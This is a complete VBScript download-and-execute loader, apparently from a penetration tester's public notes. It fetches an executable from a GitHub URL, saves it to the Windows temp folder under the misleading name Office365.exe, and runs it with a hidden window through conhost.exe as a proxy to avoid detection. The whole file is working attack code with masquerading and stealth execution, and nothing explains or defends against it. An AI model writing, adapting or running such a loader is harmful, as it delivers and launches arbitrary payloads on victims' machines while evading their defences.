downloadURL = "https://github.com/initinfosec/notes-and-refs-public/raw/master/misc_resources/testDebugMsg.exe"
saveAs = "c:\windows\temp\Office365.exe"
parameters = ""
proxyexec = "C:\windows\system32\conhost.exe"
Dim sh: Set sh = CreateObject("WScript.Shell")
out = sh.ExpandEnvironmentStrings(saveAs)

' STEP 1: Download File
Dim xhr: Set xhr = CreateObject("Msxml2.ServerXMLHTTP")
xhr.Open "GET", downloadURL, False
xhr.Send

' STEP 2: Save binary file
If xhr.Status = 200 Then
    With CreateObject("Adodb.Stream")
        .Open
        .Type = 1
        .write xhr.responseBody
        .savetofile out, 2
    End With

' STEP 3: Run file if downloaded
    cmd = proxyexec & " " & out & " " & parameters
    sh.Run cmd, 0, False
End If

Set sh = Nothing
Set xhr = Nothing
